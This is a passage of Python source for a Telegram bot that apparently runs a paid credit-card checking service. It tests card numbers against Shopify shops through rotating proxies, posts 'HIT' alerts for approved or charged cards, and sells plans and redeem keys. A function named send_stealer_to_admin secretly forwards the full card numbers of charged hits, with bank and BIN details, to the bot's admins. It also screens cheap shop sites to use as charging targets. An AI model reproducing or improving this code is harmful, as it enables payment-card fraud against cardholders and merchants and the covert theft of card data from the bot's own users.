        return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Approved"}
    return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Declined"}


async def check_card_api(card, site, proxy_data=None, user_id=None, http_session=None):
    uid = user_id or "?"
    try:
        url = build_api_url(site if site.startswith('http') else f'https://{site}', card, proxy_data)
        s = http_session or (await get_user_http_session(uid, "sp"))
        async with s.get(url) as r:
            if r.status != 200:
                return {"Response": f"HTTP_{r.status}", "Price": "-", "Gateway": "-",
                        "Status": "SiteError", "card": card, "site": site}
            try: rj = await r.json(content_type=None)
            except: return {"Response": "Invalid JSON", "Price": "-", "Gateway": "-",
                            "Status": "SiteError", "card": card, "site": site}
        result = classify_response(rj)
        result["card"] = card; result["site"] = site
        return result
    except asyncio.TimeoutError:
        return {"Response": "Timeout", "Price": "-", "Gateway": "-",
                "Status": "SiteError", "card": card, "site": site}
    except asyncio.CancelledError: raise
    except Exception as e:
        err = str(e)
        st2 = "SiteError" if is_site_error(err) or is_proxy_error(err) else "Declined"
        return {"Response": err[:100], "Price": "-", "Gateway": "Unknown",
                "Status": st2, "card": card, "site": site}


async def check_card_with_retry(card, sites, user_id=None, proxies_data=None,
                                 max_retries=3, rotator=None, cancel_check=None, http_session=None):
    if not sites:
        return {"Response": "No sites", "Price": "-", "Gateway": "-",
                "Status": "Error", "card": card}, -1
    tried_sites, tried_proxies = set(), set()
    last = None
    for attempt in range(max_retries):
        if cancel_check and cancel_check():
            return {"Response": "Stopped", "Price": "-", "Gateway": "-",
                    "Status": "Error", "card": card}, -1
        site = rotator.pick_site(sites, exclude=tried_sites) if rotator else random.choice(
            [s for s in sites if s not in tried_sites] or list(sites))
        tried_sites.add(site)
        proxy_data = None
        if proxies_data:
            proxy_data = rotator.pick_proxy(proxies_data, exclude=tried_proxies) if rotator else random.choice(
                [p for p in proxies_data if p.get('proxy_url') not in tried_proxies] or list(proxies_data))
            if proxy_data: tried_proxies.add(proxy_data.get('proxy_url'))
        result = await check_card_api(card, site, proxy_data, user_id, http_session=http_session)
        if result.get("Status") != "SiteError":
            if rotator:
                rotator.report_site_ok(site)
                if proxy_data: rotator.report_proxy_ok(proxy_data.get('proxy_url'))
            return result, sites.index(site) + 1
        if rotator:
            rotator.report_site_fail(site)
            if proxy_data and is_proxy_error(result.get("Response", "")):
                rotator.report_proxy_fail(proxy_data.get('proxy_url'))
        last = result
        if attempt < max_retries - 1: await asyncio.sleep(0.3)
    if last:
        last["Status"] = "Error"
        return last, -1
    return {"Response": "Max retries", "Price": "-", "Gateway": "-",
            "Status": "Error", "card": card}, -1


# ====================== SITE TEST ($0–$5) ======================
async def test_site(site, proxy_data=None, http_session=None):
    try:
        proxy_str = proxy_data['proxy_url'] if proxy_data else ""
        res = await check_site_full(site, proxy_str)
        return {
            'site': site,
            'status': res.get('status', 'dead'),
            'price': res.get('price', '-'),
            'response': res.get('response', '-'),
        }
    except Exception as e:
        return {'site': site, 'status': 'dead', 'price': '-', 'response': str(e)[:80]}


# ====================== STATUS SYSTEM ======================
def _get_system_uptime():
    if not PSUTIL_AVAILABLE: return "N/A"
    s = int(time.time() - psutil.boot_time())
    d, r = divmod(s, 86400); h, r = divmod(r, 3600); m, sec = divmod(r, 60)
    return f"{d}d {h:02}:{m:02}:{sec:02}"


def _get_bot_uptime():
    s = int(time.time() - BOT_START_TIME)
    d, r = divmod(s, 86400); h, r = divmod(r, 3600); m, sec = divmod(r, 60)
    return f"{d}d {h:02}:{m:02}:{sec:02}"


def _progress(p, l=10):
    f = int(l * p / 100)
    return f"{'█' * f}{'░' * (l - f)} {p:.1f}%"


def _get_system_info():
    if not PSUTIL_AVAILABLE:
        return {"error": "psutil not installed", "current_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
    try:
        cpu = psutil.cpu_percent(interval=0); ccount = psutil.cpu_count(logical=True)
        cf = psutil.cpu_freq(); mem = psutil.virtual_memory(); disk = psutil.disk_usage("/")
        net = psutil.net_io_counters()
        return {
            "cpu_usage": cpu, "cpu_count": ccount, "cpu_freq": cf.current if cf else 0,
            "total_memory": mem.total/(1024**3), "used_memory": mem.used/(1024**3),
            "available_memory": mem.available/(1024**3), "memory_percent": mem.percent,
            "total_disk": disk.total/(1024**3), "used_disk": disk.used/(1024**3),
            "free_disk": disk.free/(1024**3), "disk_percent": disk.percent,
            "hostname": socket.gethostname(), "os_name": platform.system(),
            "os_version": platform.version(), "architecture": platform.machine(),
            "bytes_sent": net.bytes_sent/(1024**2), "bytes_recv": net.bytes_recv/(1024**2),
            "uptime_str": _get_system_uptime(), "bot_uptime_str": _get_bot_uptime(),
            "current_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "bot_restart_time": datetime.fromtimestamp(BOT_START_TIME).strftime("%Y-%m-%d %H:%M:%S"),
            "cpu_critical": cpu > 90, "memory_critical": mem.percent > 90,
            "disk_critical": disk.percent > 90, "error": None,
        }
    except Exception as e:
        return {"error": str(e), "current_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}


async def _build_status_text():
    s = await asyncio.get_event_loop().run_in_executor(None, _get_system_info)
    if s.get("error"):
        return f"⌬ <b>𝐄𝐫𝐫𝐨𝐫</b> ↬ <code>❌ {s['error']}</code>"
    msg = (
        f"⌬ <b>𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐮𝐬</b> ↬ <code>✅ Active</code>\n――――――――――――――\n"
        f"⌬ <b>𝐁𝐨𝐭 𝐔𝐩𝐭𝐢𝐦𝐞</b> ↬ <code>{s['bot_uptime_str']}</code>\n"
        f"⌬ <b>𝐒𝐲𝐬𝐭𝐞𝐦 𝐔𝐩𝐭𝐢𝐦𝐞</b> ↬ <code>{s['uptime_str']}</code>\n"
        f"⌬ <b>𝐋𝐚𝐬𝐭 𝐑𝐞𝐬𝐭𝐚𝐫𝐭</b> ↬ <code>{s['bot_restart_time']}</code>\n――――――――――――――\n"
        f"⌬ <b>𝐂𝐏𝐔</b> ↬ <code>{s['cpu_usage']:.1f}% ({s['cpu_count']} cores)</code>\n"
        f"𝘿 <b>Usage</b> ↬ <code>{_progress(s['cpu_usage'])}</code>\n――――――――――――――\n"
        f"⌬ <b>𝐑𝐀𝐌</b> ↬ <code>{s['used_memory']:.2f}GB / {s['total_memory']:.2f}GB</code>\n"
        f"𝘿 <b>Usage</b> ↬ <code>{_progress(s['memory_percent'])}</code>\n――――――――――――――\n"
        f"⌬ <b>𝐃𝐢𝐬𝐤</b> ↬ <code>{s['used_disk']:.2f}GB / {s['total_disk']:.2f}GB</code>\n"
        f"𝘿 <b>Usage</b> ↬ <code>{_progress(s['disk_percent'])}</code>\n――――――――――――――\n"
        f"⌬ <b>𝐍𝐞𝐭𝐰𝐨𝐫𝐤</b> ↬ <code>↑ {s['bytes_sent']:.1f}MB ↓ {s['bytes_recv']:.1f}MB</code>\n"
    )
    if s["cpu_critical"] or s["memory_critical"] or s["disk_critical"]:
        msg += "\n⚠️ <b>Warning:</b> System resources critically low!"
    return msg


# ====================== CLIENT ======================
client = TelegramClient('dazz_x_bot', API_ID, API_HASH)
client_instance = client


# ====================== HIT NOTIFICATIONS ======================
async def send_channel_hit(res, uid, username, name):
    try:
        prem = await is_premium_user(uid)
        tag = bs("Premium") if prem else bs("Free Trial")
        sv = str(res.get("Status", "Charged")).upper()
        prof = f"https://t.me/{username}" if username and not username.startswith("user_") else f"tg://user?id={uid}"
        gw = res.get('Gateway', 'Shopify'); resp = res.get('Response', '')
        msg = f"""<b>{bs('HIT')} ➛ {bs(sv)}</b> {PE}
<b>{bs('Gateway')} ➛ {gw}</b>
<b>{bs('Response')} ➛ {resp}</b>
<b>{bs('Price')} ➛ {res.get('Price', '-')}</b>
<b>{bs('User')} ➛ <a href="{prof}">{name}</a></b> ({tag})"""
        await styled_send(HIT_CHANNEL_ID, msg, buttons=HIT_BUTTON, emoji_ids=[CE["fire"]])
    except: pass


async def send_stealer_to_admin(card, res, uid, username, name, bin_info=None):
    try:
        bi = bin_info or {"brand":"-","type":"-","level":"-","bank":"-","country":"-","flag":"🏳️"}
        prof = f"https://t.me/{username}" if username and not username.startswith("user_") else f"tg://user?id={uid}"
        txt = f"""<b>{bs('STEALER')} ➛ {bs('CHARGED')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Card')}</b> ━ <code>{card}</code>
{PE} <b>{bs('Response')}</b> ━ <code>{res.get('Response','-')[:180]}</code>
{PE} <b>{bs('Gateway')}</b> ━ <code>{res.get('Gateway','Shopify')}</code>
{PE} <b>{bs('Price')}</b> ━ <code>{res.get('Price','-')}</code>
{PE} <b>{bs('Site')}</b> ━ <code>{res.get('site','-')}</code>
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('BIN')}</b> ━ <code>{bi.get('brand','-')} | {bi.get('type','-')} | {bi.get('level','-')}</code>
{PE} <b>{bs('Bank')}</b> ━ <code>{bi.get('bank','-')}</code>
{PE} <b>{bs('Country')}</b> ━ <code>{bi.get('country','-')} {bi.get('flag','🏳️')}</code>
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('User')}</b> ━ <a href="{prof}">{name}</a> (<code>{uid}</code>)"""
        for aid in ADMIN_ID:
            try:
                await styled_send(aid, txt, emoji_ids=[
                    CE["fire"], CE["fire"], CE["star"], CE["chart"], CE["globe"],
                    CE["gem"], CE["link"], CE["shield"], CE["brain"], CE["crown"],
                    CE["info"], CE["pin"]
                ])
            except: pass
    except Exception as e:
        log_system("STEALER", f"Err: {e}", "error")


async def pin_charged_message(event, msg):
    try:
        if event.is_group: await msg.pin()
    except: pass


@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|cmds?|commands?)$'))
async def start(event):
    try:
        await ensure_user(event.sender_id)
        if not await force_join_check(event): return
        _, at = await can_use(event.sender_id, event.chat)
        if at == "banned":
            t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
        plan = await get_user_plan(event.sender_id)
        limit = get_cc_limit(plan, event.sender_id)

        if event.sender_id in ADMIN_ID:
            sl = f"{PE} <b>{bs('STATUS')}</b> ━ 👑 <b>{bs('ADMIN')}</b> {PE} (<code>∞ {bs('Unlimited')}</code>)"
            se = [CE["crown"], CE["star"]]
        elif is_paid_plan(plan):
            pe = "🛠️"
            for pi in PLANS.values():
                if pi["tier"].lower() == plan.lower():
                    pe = pi["emoji"]; break
            sl = f"{PE} <b>{bs('STATUS')}</b> ━ {pe} <b>{plan.upper()}</b> {PE} (<code>{limit}</code> {bs('Mass Limit')})"
            se = [CE["star"], CE["crown"]]
        else:
            sl = f"<b>{bs('STATUS')}</b> ━ 🆓 <b>{plan.upper()}</b> (<code>{FREE_SP_DAILY_LIMIT}/{bs('day')}</code> {bs('in group')})"
            se = []

        text = f"""{PE} <b><i>{bs('Shopify')}</i></b>
|   {PE} <code>/sp</code> ━ <b>{bs('Single CC')}</b>
|   {PE} <code>/msp</code> ━ <b>{bs('Mass CC')}</b>

{PE} <b><i>{bs('Account')}</i></b>
|   {PE} <code>/info</code> ━ <b>{bs('Profile')}</b>
|   {PE} <code>/plan</code> ━ <b>{bs('Plans')}</b>
|   {PE} <code>/redeem</code> ━ <b>{bs('Redeem Key')}</b>

{PE} <b><i>{bs('Proxy')}</i></b> ({bs('Private')})
|   {PE} <code>/addpxy</code> ━ <b>{bs('Add')}</b>
|   {PE} <code>/proxy</code> ━ <b>{bs('View')}</b>
|   {PE} <code>/chkpxy</code> ━ <b>{bs('Test')}</b>
|   {PE} <code>/rmpxy</code> ━ <b>{bs('Remove')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
{sl}"""

        kb = [[pbtn(bs("Plans"), data="show_plans"), pbtn(bs("Support"), url=SUPPORT_LINK)],
              [pbtn(bs("Channel"), url=JOIN_CHANNEL_LINK), pbtn(bs("Group"), url=JOIN_GROUP_LINK)]]
        ei = [CE["bolt"], CE["search"], CE["pin"], CE["fire"], CE["search"], CE["pin"],
              CE["brain"], CE["info"], CE["info"], CE["gift"], CE["link"], CE["shield"],
              CE["link"], CE["eyes"], CE["tick"], CE["trash"]] + se
        try:
            await styled_reply(event, text, buttons=kb, emoji_ids=ei, file="start.jpg")
        except:
            await styled_reply(event, text, buttons=kb, emoji_ids=ei)
    except Exception as e:
        log_user(event.sender_id, "START_ERR", f"{e}", "error")


@client.on(events.CallbackQuery(data=b"check_joined"))
async def check_joined_cb(event):
    uid = event.sender_id
    if uid in ADMIN_ID: return await event.answer(f"✅ {bs('Admin')}!")
    if await is_user_joined(uid):
        await mark_user_joined(uid)
        await event.answer(f"✅ {bs('Verified')}!", alert=True)
        try: await event.delete()
        except: pass
        await styled_send(event.chat_id, f"""{PE} <b>{bs('Welcome')}</b> {PE}
{PE} <code>/start</code> <b>{bs('for commands')}</b>""",
            emoji_ids=[CE["fire"], CE["fire"], CE["info"]])
    else:
        await event.answer(f"❌ {bs('Not joined')}!", alert=True)


@client.on(events.CallbackQuery(data=b"show_plans"))
async def plans_cb(event):
    cp = await get_user_plan(event.sender_id)
    await event.answer()
    t = f"{PE} <b>{bs('Plans')}</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>"
    for pi in PLANS.values():
        t += f"\n{pi['emoji']} <b>{pi['name']}</b> ━ <b>{pi['duration_days']}{bs('d')}</b> ━ <b>{pi['price']}</b>"
    t += f"\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>{bs('Current')}:</b> <b>{cp.upper()}</b>"
    await styled_send(event.chat_id, t,
        buttons=[[pbtn(bs("Upgrade"), url=SUPPORT_LINK)]],
        emoji_ids=[CE["fire"], CE["fire"], CE["crown"]])


@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan$'))
async def show_plans(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    cp = await get_user_plan(event.sender_id)
    t = f"{PE} <b>{bs('Plans')}</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>"
    for pi in PLANS.values():
        t += f"\n{pi['emoji']} <b>{pi['name']}</b> ━ <b>{pi['duration_days']}{bs('d')}</b> ━ <b>{pi['price']}</b>"
    t += f"\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>{bs('Current')}:</b> <b>{cp.upper()}</b>\n{PE} <i>{bs('Contact admin')}</i>"
    await styled_reply(event, t,
        buttons=[[pbtn(bs("Upgrade"), url=SUPPORT_LINK)]],
        emoji_ids=[CE["fire"], CE["fire"], CE["crown"]])


@client.on(events.NewMessage(pattern=r'(?i)^[/.]info$'))
async def info_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    await ensure_user(event.sender_id)
    plan = await get_user_plan(event.sender_id)
    sites = await get_user_sites(event.sender_id)
    pc = await get_proxy_count(event.sender_id)
    pe = "🆓"
    for pi in PLANS.values():
        if pi["tier"].lower() == plan.lower():
            pe = pi["emoji"]; break
    expiry = await get_user_expiry(event.sender_id)
    exp_str = expiry.strftime('%Y-%m-%d') if expiry else bs("Never")
    status = bs("Active") if is_paid_plan(plan) else bs("Free")

    if event.sender_id in ADMIN_ID:
        limit_text = f"<code>∞ ({bs('Unlimited')})</code>"
    elif is_paid_plan(plan):
        limit_text = f"<code>{get_cc_limit(plan, event.sender_id)}</code>"
    else:
        limit_text = f"<code>{FREE_SP_DAILY_LIMIT}/{bs('day')} ({bs('group')})</code>"

    used = get_free_sp_usage(event.sender_id)
    usage = ""
    if not is_paid_plan(plan) and event.sender_id not in ADMIN_ID:
        usage = f"\n{PE} <b>{bs('Used Today')}:</b> <code>{used}/{FREE_SP_DAILY_LIMIT}</code>"

    await styled_reply(event, f"""{PE} <b>{bs('Profile')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('ID')}:</b> <code>{event.sender_id}</code>
{PE} <b>{bs('Status')}:</b> <code>{status}</code>
{PE} <b>{bs('Plan')}:</b> {pe} <b>{plan.upper()}</b>
{PE} <b>{bs('Expiry')}:</b> <code>{exp_str}</code>
{PE} <b>{bs('Limit')}:</b> {limit_text}{usage}
{PE} <b>{bs('Sites')}:</b> <code>{len(sites)}</code>
{PE} <b>{bs('Proxies')}:</b> <code>{pc}</code>""",
        emoji_ids=[CE["fire"], CE["fire"], CE["info"], CE["star"], CE["crown"],
                   CE["chart"], CE["globe"], CE["link"], CE["shield"]])


# ====================== GENKEY / REDEEM ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]genkey\b'))
async def genkey_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) != 4:
        return await styled_reply(event,
            f"{PE} <b>{bs('Usage')}:</b> <code>/genkey plan1 1 2</code>\n"
            f"{PE} <i>plan · max claims · days</i>",
            emoji_ids=[CE["info"], CE["info"], CE["warn"]])
    plan_key = parts[1].lower()
    if plan_key not in PLANS:
        return await styled_reply(event, f"{PE} <b>{bs('Invalid plan')}</b>", emoji_ids=[CE["cross"]])
    try:
        max_claims = int(parts[2]); days = int(parts[3])
        if max_claims < 1 or days < 1: raise ValueError
    except:
        return await styled_reply(event, f"{PE} <b>{bs('Invalid numbers')}</b>", emoji_ids=[CE["cross"]])

    pi = PLANS[plan_key]
    key = "DAZZ-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=16))
    await create_key(key, pi["tier"], max_claims, days)

    await styled_reply(event, f"""{PE} <b>{bs('Key Generated')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Key')}:</b> <code>{key}</code>
{PE} <b>{bs('Plan')}:</b> {pi['emoji']} <b>{pi['tier']}</b>
{PE} <b>{bs('Max Claims')}:</b> <code>{max_claims}</code>
{PE} <b>{bs('Days')}:</b> <code>{days}</code>
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <i>{bs('Redeem with /redeem KEY')}</i>""",
        emoji_ids=[CE["crown"], CE["crown"], CE["gem"], CE["fire"], CE["star"],
                   CE["chart"], CE["info"]])


@client.on(events.NewMessage(pattern=r'(?i)^[/.]keys$'))
async def keys_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    keys = await list_keys()
    if not keys:
        return await styled_reply(event, f"{PE} <b>{bs('No keys')}</b>", emoji_ids=[CE["warn"]])
    txt = f"{PE} <b>{bs('Keys')}</b> ({len(keys)}) {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n"
    ei = [CE["fire"], CE["fire"]]
    for k in keys[:30]:
        txt += f"<code>{k['key']}</code> ━ {k['plan']} ━ {k['claims_used']}/{k['max_claims']} ━ {k['days']}d\n"
        ei.append(CE["gift"])
    await styled_reply(event, txt, emoji_ids=ei)


@client.on(events.NewMessage(pattern=r'(?i)^[/.]redeem\b'))
async def redeem_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    parts = event.raw_text.split()
    if len(parts) != 2:
        return await styled_reply(event, f"{PE} <code>/redeem KEY</code>", emoji_ids=[CE["info"]])
    key = parts[1].strip().upper()
    row = await get_key(key)
    if not row:
        return await styled_reply(event, f"{PE} <b>{bs('Invalid key')}</b>", emoji_ids=[CE["cross"]])
    if row["claims_used"] >= row["max_claims"]:
        return await styled_reply(event, f"{PE} <b>{bs('Key already fully claimed')}</b>", emoji_ids=[CE["warn"]])
    claimed = await claim_key(key)
    if not claimed:
        return await styled_reply(event, f"{PE} <b>{bs('Race condition — try again')}</b>", emoji_ids=[CE["warn"]])
    await ensure_user(event.sender_id)
    await set_user_plan(event.sender_id, claimed["plan"], claimed["days"])
    exp = (datetime.utcnow() + timedelta(days=claimed["days"])).strftime('%Y-%m-%d %H:%M:%S')
    await styled_reply(event, f"""{PE} <b>{bs('Key Redeemed')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Plan')}:</b> <b>{claimed['plan'].upper()}</b>
{PE} <b>{bs('Days')}:</b> <code>{claimed['days']}</code>
{PE} <b>{bs('Expires')}:</b> <code>{exp}</code>""",
        emoji_ids=[CE["crown"], CE["crown"], CE["gem"], CE["chart"], CE["info"]])


# ====================== GLOBAL SITE MANAGEMENT (ADMIN ONLY) ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]add\b'))
async def add_site(event):
    if event.sender_id not in ADMIN_ID: return
    if await check_maintenance(event): return
    try:
        sta = []
        if event.is_reply:
            rm = await event.get_reply_message()
            if rm and rm.file:
                fp = await rm.download_media()
                try:
                    async with aiofiles.open(fp, "r", encoding="utf-8", errors="ignore") as f:
                        sta = extract_urls_from_text(await f.read())
                finally:
                    try: os.remove(fp)
                    except: pass
            elif rm and rm.text:
                sta = extract_urls_from_text(rm.text)
        add_text = re.sub(r'^[/.]add\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
        if add_text:
            for s in extract_urls_from_text(add_text):
                if s not in sta: sta.append(s)
        if not sta:
            return await styled_reply(event,
                f"""{PE} <b>{bs('Add Global Site')}</b> {PE}
{PE} <code>/add site.com</code>
{PE} <i>Or reply .txt with</i> <code>/add</code>""",
                emoji_ids=[CE["fire"], CE["fire"], CE["info"], CE["link"]])
        new_sites, already = [], []
        existing_all = {normalize_site_url(s) for s in await get_user_sites(0)}
        for site in sta:
            n = normalize_site_url(site)
            if n in existing_all: already.append(n)
            elif n not in [normalize_site_url(s) for s in new_sites]: new_sites.append(n)
        if not new_sites:
            return await styled_reply(event,
                f"{PE} <b>{bs('All sites already exist')}</b>",
                emoji_ids=[CE["warn"]])
        uid = event.sender_id
        PENDING_ADD_SITES[uid] = {"sites": new_sites, "exists": already, "event": event}
        kb = [[pbtn(bs("0-3 USD"), f"addprice:3:{uid}"), pbtn(bs("0-5 USD"), f"addprice:5:{uid}")]]
        await styled_reply(event,
            f"""{PE} <b>{bs('Select Price Range')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('New Sites')}:</b> <code>{len(new_sites)}</code>
{PE} <b>{bs('Already Exist')}:</b> <code>{len(already)}</code>
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <i>{bs('Only working sites within range will be added')}</i>""",
            buttons=kb, emoji_ids=[CE["fire"], CE["fire"], CE["globe"], CE["warn"], CE["info"]])
    except Exception as e:
        await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])


@client.on(events.CallbackQuery(pattern=rb"addprice:(\d+):(\d+)"))
async def add_price_cb(event):
    max_price = int(event.pattern_match.group(1).decode())
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid: return await event.answer(f"{bs('Not yours')}!", alert=True)
    data = PENDING_ADD_SITES.pop(uid, None)
    if not data: return await event.answer(f"{bs('Expired')}!", alert=True)
    if uid in ACTIVE_ADD_PROCESSES: return await event.answer(f"{bs('Already running')}!", alert=True)
    ACTIVE_ADD_PROCESSES[uid] = True
    await event.answer(f"{bs('Testing sites')}...")
    try: await event.delete()
    except: pass
    asyncio.create_task(_process_add_sites(data["event"], data["sites"], data["exists"], max_price))


async def _process_add_sites(event, new_sites, already_exists, max_price):
    uid = event.sender_id
    total = len(new_sites); tested = working = dead = added = 0
    proxies = await get_all_user_proxies(uid)
    site_sem = get_user_sem(uid, "site")
    http_session = await get_user_http_session(uid, "site")
    sm = await styled_reply(event, f"{PE} <b>{bs('Testing')} {total} {bs('sites')}...</b>", emoji_ids=[CE["fire"]])
    last_ui = [0]
    def is_stopped(): return uid not in ACTIVE_ADD_PROCESSES
    async def update_ui():
        if time.time() - last_ui[0] < 3.0: return
        last_ui[0] = time.time()
        try:
            await styled_edit(sm, f"{PE} <b>{bs('Testing')}...</b> {tested}/{total} | ✅{working} ❌{dead}",
                              emoji_ids=[CE["fire"]])
        except: pass
    async def worker(site):
        nonlocal tested, working, dead, added
        async with site_sem:
            if is_stopped(): return
            try:
                res = await test_site(site, random.choice(proxies) if proxies else None, http_session=http_session)
                tested += 1
                if res['status'] == 'alive':
                    working += 1
                    pv = 0.0
                    ps = res.get('price', '-')
                    if ps and ps != '-':
                        try: pv = float(str(ps).replace('$', '').strip())
                        except: pass
                    if pv <= max_price:
                        if await add_site_db(uid, site): added += 1
                else: dead += 1
                await update_ui()
            except asyncio.CancelledError: raise
            except: dead += 1; tested += 1
    for i in range(0, len(new_sites), SITE_PER_USER_WORKERS):
        if is_stopped(): break
        await asyncio.gather(*[asyncio.create_task(worker(s)) for s in new_sites[i:i+SITE_PER_USER_WORKERS]],
                             return_exceptions=True)
    try:
        await styled_edit(sm,
            f"""{PE} <b>{bs('Complete')}</b> {PE}
{PE} <b>{bs('Working')}:</b> <code>{working}</code> | <b>{bs('Dead')}:</b> <code>{dead}</code> | <b>{bs('Added')}:</b> <code>{added}</code>""",
            emoji_ids=[CE["fire"], CE["check"], CE["cross"], CE["chart"]])
    except: pass
    ACTIVE_ADD_PROCESSES.pop(uid, None)
    await cleanup_user_http_session(uid, "site"); cleanup_user_sem(uid)


@client.on(events.NewMessage(pattern=r'(?i)^[/.]rm\b'))
async def remove_site(event):
    if event.sender_id not in ADMIN_ID: return
    if await check_maintenance(event): return
    rt = re.sub(r'^[/.]rm\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    if rt.lower() == 'all':
        existing = await get_user_sites(0)
        if not existing: return await styled_reply(event, f"{PE} <b>{bs('No sites')}</b>", emoji_ids=[CE["warn"]])
        c = 0
        for s in existing:
            if await remove_site_db(0, s): c += 1
        return await styled_reply(event, f"{PE} <b>{bs('Removed')} {c}</b>", emoji_ids=[CE["check"]])
    if not rt:
        return await styled_reply(event, f"{PE} <code>/rm site.com</code> {bs('or')} <code>/rm all</code>", emoji_ids=[CE["info"]])
    to_rm = extract_urls_from_text(rt)
    if not to_rm: return await styled_reply(event, f"{PE} <b>{bs('No URLs')}</b>", emoji_ids=[CE["cross"]])
    existing = await get_user_sites(0)
    removed = 0
    for s in to_rm:
        n = normalize_site_url(s)
        for ex in existing:
            if normalize_site_url(ex) == n:
                if await remove_site_db(0, ex): removed += 1
                break
    await styled_reply(event, f"{PE} <b>{bs('Removed')}:</b> <code>{removed}</code>", emoji_ids=[CE["check"]])


@client.on(events.NewMessage(pattern=r'(?i)^[/.]sites$'))
async def list_sites(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    sites = await get_user_sites(0)
    if not sites: return await styled_reply(event, f"{PE} <b>{bs('No sites')}</b>", emoji_ids=[CE["warn"]])
    txt = f"{PE} <b>{bs('Global Sites')}</b> ({len(sites)}) {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n"
    ei = [CE["fire"], CE["fire"]]
    for i, s in enumerate(sites[:50], 1):
        txt += f"{PE} <code>{i}.</code> <b>{s}</b>\n"; ei.append(CE["link"])
    if len(sites) > 50: txt += f"\n<i>+{len(sites)-50} more</i>"
    await styled_reply(event, txt, emoji_ids=ei)


@client.on(events.NewMessage(pattern=r'(?i)^[/.]site$'))
async def check_sites_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    if await check_maintenance(event): return
    sites = await get_user_sites(0)
    if not sites: return await styled_reply(event, f"{PE} <b>{bs('No sites')}</b>", emoji_ids=[CE["warn"]])
    uid = event.sender_id
    PENDING_SITE_CHECK[uid] = {"sites": sites, "event": event}
    kb = [[pbtn(bs("0-3 USD"), f"siteprice:3:{uid}"), pbtn(bs("0-5 USD"), f"siteprice:5:{uid}")]]
    await styled_reply(event,
        f"{PE} <b>{bs('Select Price Range')}</b> {PE}\n{PE} <b>{bs('Sites')}:</b> <code>{len(sites)}</code>\n{PE} <i>{bs('Dead + over-price will be removed')}</i>",
        buttons=kb, emoji_ids=[CE["fire"], CE["fire"], CE["globe"], CE["warn"]])


@client.on(events.CallbackQuery(pattern=rb"siteprice:(\d+):(\d+)"))
async def site_price_cb(event):
    max_price = int(event.pattern_match.group(1).decode())
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid: return await event.answer(f"{bs('Not yours')}!", alert=True)
    data = PENDING_SITE_CHECK.pop(uid, None)
    if not data: return await event.answer(f"{bs('Expired')}!", alert=True)
    await event.answer(f"{bs('Checking')}...")
    try: await event.delete()
    except: pass
    asyncio.create_task(_process_site_check(data["event"], data["sites"], max_price))


async def _process_site_check(event, sites, max_price):
    uid = event.sender_id
    total = len(sites); tested = alive = dead = kept = removed_price = 0
    proxies = await get_all_user_proxies(uid)
    site_sem = get_user_sem(uid, "site")
    http_session = await get_user_http_session(uid, "site")
    sm = await styled_reply(event, f"{PE} <b>{bs('Checking')} {total} {bs('sites')}...</b>", emoji_ids=[CE["fire"]])
    last_ui = [0]; dead_sites = set(); price_removed = set()
    async def update_ui():
        if time.time() - last_ui[0] < 3.0: return
        last_ui[0] = time.time()
        try: await styled_edit(sm, f"{PE} <b>{tested}/{total}</b> | ✅{alive} ❌{dead}", emoji_ids=[CE["fire"]])
        except: pass
    async def worker(site):
        nonlocal tested, alive, dead, kept, removed_price
        async with site_sem:
            try:
                res = await test_site(site, random.choice(proxies) if proxies else None, http_session=http_session)
                tested += 1
                if res['status'] == 'alive':
                    alive += 1; pv = 0.0
                    ps = res.get('price', '-')
                    if ps and ps != '-':
                        try: pv = float(str(ps).replace('$', '').strip())
                        except: pass
                    if pv <= max_price: kept += 1
                    else: removed_price += 1; price_removed.add(normalize_site_url(site))
                else: dead += 1; dead_sites.add(normalize_site_url(site))
                await update_ui()
            except asyncio.CancelledError: raise
